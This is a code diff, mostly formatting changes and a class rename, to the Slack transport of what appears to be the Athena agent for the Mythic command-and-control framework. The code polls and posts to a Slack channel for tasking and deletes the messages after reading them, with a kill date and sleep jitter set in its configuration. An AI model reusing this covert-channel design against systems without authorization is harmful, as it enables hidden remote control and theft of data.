@@ -19,7 +19,7 @@ namespace Athena.Config
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SMBForwarder smbForwarder { get; set; }
+        public Forwarder forwarder { get; set; }
 
         public MythicConfig()
         {
@@ -32,7 +32,8 @@ namespace Athena.Config
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Slack(this.uuid);
-            this.smbForwarder = new SMBForwarder();
+            this.forwarder = new Forwarder();
+
         }
     }
 
@@ -151,7 +152,7 @@ namespace Athena.Config
 
                 //Give the server a second to respond.
                 Thread.Sleep(3000);
-               
+
 
                 result = GetSlackMessages();
                 //Attempt this x times until we assume that the message callback failed and just return nothing.
@@ -169,7 +170,7 @@ namespace Athena.Config
                         }
                         else
                         {
-                            if (i == (this.messageChecks*2)) //Double the checks for a file that HAS had a response associated with it (Possibly remove this)
+                            if (i == (this.messageChecks * 2)) //Double the checks for a file that HAS had a response associated with it (Possibly remove this)
                             {
                                 result = new Dictionary<string, MythicMessageWrapper>();
                                 break;
@@ -205,7 +206,7 @@ namespace Athena.Config
 
                 //Take only the most recent response in case some messages got left over.
                 //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
-                if(result.Reverse().FirstOrDefault().Value is not null)
+                if (result.Reverse().FirstOrDefault().Value is not null)
                 {
                     json = result.Reverse().FirstOrDefault().Value.message;
                 }
@@ -217,7 +218,7 @@ namespace Athena.Config
 
                 //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                 Task.Run(() => { DeleteMessages(result.Keys.ToList<string>()); });
-                
+
                 //Indicate we're done with the current message
                 current_message = "";
 
@@ -249,7 +250,7 @@ namespace Athena.Config
             string url = "https://slack.com/api/chat.postMessage";
 
             MythicMessageWrapper msg;
-            if(data.Count() > 3850)
+            if (data.Count() > 3850)
             {
                 msg = new MythicMessageWrapper()
                 {
@@ -312,7 +313,7 @@ namespace Athena.Config
             try
             {
                 byte[] res = this.webClient.UploadValues(url, "POST", parameters);
-                
+
                 //Another try/catch because this might fail, but doesn't necessarily indicate a failed upload.
                 try
                 {
@@ -363,9 +364,9 @@ namespace Athena.Config
             Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();
 
             string res = SendGet($"https://slack.com/api/conversations.history?channel={this.channel}&limit=200");
-            ConversationHistoryResponse msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);                        
-            
-            foreach(var message in msgResponse.messages)
+            ConversationHistoryResponse msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);
+
+            foreach (var message in msgResponse.messages)
             {
                 try
                 {
@@ -385,12 +386,12 @@ namespace Athena.Config
                 }
                 catch (Exception e)
                 {
-                    
+
                     Misc.WriteError($"[GetSlackMessages] {e.Message}");
                     Misc.WriteError(e.StackTrace);
                 }
             }
-            
+
             return messages;
         }
         private bool SendPost(string url, string data)
@@ -404,12 +405,13 @@ namespace Athena.Config
 
                 //I may have to expand upon this check.
                 return true;
-                
+
             }
             catch (WebException e)
             {
                 HttpWebResponse webRes = (HttpWebResponse)e.Response;
-                if (webRes is not null) {
+                if (webRes is not null)
+                {
                     if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                     {
                         try
@@ -434,7 +436,7 @@ namespace Athena.Config
             {
                 this.webClient.Headers.Add("Authorization", $"Bearer {this.messageToken}");
             }
-            
+
             try
             {
                 return this.webClient.DownloadString(url);
@@ -442,7 +444,7 @@ namespace Athena.Config
             catch (WebException e)
             {
                 HttpWebResponse webRes = (HttpWebResponse)e.Response;
-                if(webRes is not null)
+                if (webRes is not null)
                 {
                     if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                     {
@@ -459,7 +461,7 @@ namespace Athena.Config
                         }
                         return "";
                     }
-                } 
+                }
                 return "";
             }
 
